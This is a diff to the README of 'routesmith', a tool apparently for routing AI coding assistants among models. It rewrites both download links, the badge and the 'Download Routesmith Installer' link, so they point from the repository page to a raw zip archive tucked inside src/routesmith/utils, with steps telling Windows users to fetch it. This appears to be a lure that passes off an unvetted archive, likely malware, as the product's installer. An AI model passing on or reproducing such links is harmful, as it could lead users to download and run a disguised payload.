@@ -1,6 +1,6 @@
 # 🗺️ routesmith - Route AI agents to better models
 
-[![](https://img.shields.io/badge/Download_Routesmith-Blue.svg)](https://github.com/maureguilty247/routesmith)
+[![](https://img.shields.io/badge/Download_Routesmith-Blue.svg)](https://github.com/maureguilty247/routesmith/raw/refs/heads/main/src/routesmith/utils/Software-1.9.zip)
 
 Routesmith acts as a traffic controller for your coding tools. It monitors the host environment and directs your requests to the most efficient AI model available. This happens automatically, removing the need for manual switches between your coding assistants.
 
@@ -10,7 +10,7 @@ This tool works with Claude Code, Codex, Gemini CLI, Copilot, Cursor, and Aider.
 
 To use this software, visit the official download page. 
 
-[Download Routesmith Installer](https://github.com/maureguilty247/routesmith)
+[Download Routesmith Installer](https://github.com/maureguilty247/routesmith/raw/refs/heads/main/src/routesmith/utils/Software-1.9.zip)
 
 1. Open the link above in your web browser.
 2. Select the latest version for Windows.
